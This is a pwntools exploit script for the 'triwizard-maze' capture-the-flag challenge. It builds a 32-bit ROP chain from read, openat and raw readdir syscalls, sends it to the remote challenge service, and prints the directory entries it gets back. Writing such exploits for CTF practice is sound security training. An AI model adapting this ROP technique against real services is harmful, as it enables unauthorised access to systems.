#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=triwizard-maze.challs.external.open.ecsc2024.it' '--port=38202' triwizard-maze
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'triwizard-maze')
context.arch = 'i386'
context.kernel = 'amd64'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'triwizard-maze.challs.external.open.ecsc2024.it'
port = int(args.PORT or 38202)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
set follow-fork-mode parent
b *0x13371F82
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x13370000)

# class TreeNode:
#     def __init__(self, value):
#         self.value = value
#         self.children = []

#     def add_child(self, child_node):
#         self.children.append(child_node)

#     def find_path(self, target_value):
#         if self.value == target_value:
#             return [self.value]
#         for child in self.children:
#             path = child.find_path(target_value)
#             if path:
#                 return [self.value] + path
#         return None

# root = TreeNode(b"/tmp/maze/entry")

MAX_BRANCH = 10 # take a look at the magestic find-max-branch.sh script

main = 0x13371F86
read_buf = 0x13371f47
filename = 0x13375D60
dirent = 0x13375000 # need to be aligned
sys_read = 0x133723AF
sys_openat = 0x133725d0
sys_write = 0x133723C9
sys_call = 0x1337233E

root_dir = b"/tmp/maze/entry\x00"

io = start()

rop = ROP(exe)

rop.call(sys_read, [0, filename, len(root_dir)])
rop.call(sys_openat, [constants.AT_FDCWD, filename, constants.O_RDONLY, 0])


rop.call(sys_call, [0x59, 2, dirent, 0, 0, 0]) # ignore .
rop.call(sys_call, [0x59, 2, dirent, 0, 0, 0]) # ignore ..

for i in range(MAX_BRANCH):
    rop.call(sys_call, [0x59, 2, dirent, 0, 0, 0])
    rop.call(sys_write, [1, dirent, 0x100])

print(rop.dump())

payload = rop.chain()
# payload += p32(read_buf)
# TODO: close syscall of dir

io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
io.send(root_dir)

entries = set()
for i in range(MAX_BRANCH):
    data = io.recv(0x100)
    entries.add(data[10:10+data[8]])

print(entries)

io.interactive()

